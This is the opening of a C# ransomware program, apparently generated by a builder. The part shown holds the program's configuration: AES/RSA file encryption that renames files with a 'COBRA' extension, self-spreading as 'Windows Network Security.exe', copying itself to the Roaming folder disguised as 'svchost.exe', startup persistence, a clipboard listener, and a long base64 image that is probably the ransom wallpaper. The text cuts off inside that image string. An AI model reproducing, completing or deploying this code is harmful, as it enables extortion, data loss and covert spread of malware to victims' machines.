using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "COBRA";

	private static bool checkSpread = true;

	private static string spreadName = "Windows Network Security.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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